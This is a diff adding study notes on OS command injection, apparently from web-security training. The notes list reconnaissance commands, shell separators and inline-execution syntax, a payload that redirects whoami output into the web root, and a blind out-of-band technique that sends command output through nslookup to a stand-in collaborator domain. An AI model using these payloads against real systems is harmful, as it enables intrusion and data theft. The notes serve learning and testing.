@@ -2,3 +2,43 @@ os command injection
 
 NOTE:-- understand the context in which it is used
 eg --> it may be either parematers or some type of assignment to the command or any script
+
+1) USEFUL COMMANDS:--->
+
+Purpose of command 	    Linux 	       Windows
+Name of current user 	  whoami 	       whoami
+Operating system 	      uname -a 	     ver
+Network configuration 	ifconfig 	     ipconfig /all
+Network connections 	  netstat -an 	 netstat -an
+Running processes 	    ps -ef 	       tasklist 
+ 
+2)  Exploiting blind OS command injection by redirecting output
+  & whoami > /var/www/static/whoami.txt &    ----> execute the comnamd to redirect output 
+  https://vulnerable-website.com/whoami.txt     -----> then read the output if possible using file read
+
+3)Ways of injecting OS commands
+cmd separators for both win and linux --->
+
+    &
+    &&
+    |
+    ||
+only for linux  --> 
+    1  ---> ;
+   2---->  Newline (0x0a or \n)
+ On Unix-based systems, you can also use backticks or the dollar character to perform inline execution of an injected command within the original command:
+
+    `injected command ` ----> backtikcs
+    $(injected command )
+
+
+3) sometimes u need to either terminate with " or ' or start with ' or  "
+
+
+NOTE----> separators at end should be used as sometimes they are used to separate whats comes after it thus executing code successfully
+
+4)blind cmd exec:
+i.using time delay -----> ping -c localhost
+ii. using oast tehcnique ---> using nsllokup   ----> use nslookup collaboratordomain
+if oast is found we ca use the followinf to get data  ----> nslokup `cmd`.collabdomain    or    nslookup $(cmd).domain
+
